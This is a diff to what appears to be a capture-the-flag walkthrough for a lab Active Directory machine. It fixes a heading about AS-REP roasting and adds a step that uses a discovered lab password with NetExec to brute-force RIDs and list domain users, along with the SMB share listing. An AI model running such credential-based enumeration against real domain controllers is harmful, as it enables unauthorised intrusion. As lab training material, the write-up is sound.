@@ -176,7 +176,7 @@ Version: v1.0.3 (9dad6e1) - 10/04/26 - Ronnie Flathers @ropnop
 
 These users are valid
 
-# ASREP roasting leads to user c
+# ASREP roasting leads to user compromise
 
 After getting some valid users ill try some ASREP roasting
 
@@ -218,6 +218,28 @@ SMB         10.129.232.99   445    DC01             IPC$            READ        
 SMB         10.129.232.99   445    DC01             NETLOGON        READ            Logon server share 
 SMB         10.129.232.99   445    DC01             SYSVOL          READ            Logon server share
 ```
+
+Just default shares
+
+```python
+nxc smb dc01.infiltrator.htb -u l.clark -p 'WAT?watismypass!' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+D.anderson
+L.clark
+M.harris
+O.martinez
+A.walker
+K.turner
+E.rodriguez
+winrm_svc
+infiltrator_svc$
+lan_managment
+```
+
+Ill also dump the users using `--rid-brute` since that will also get machine accounts
 
 # Password stored in user descriptions
 ```python
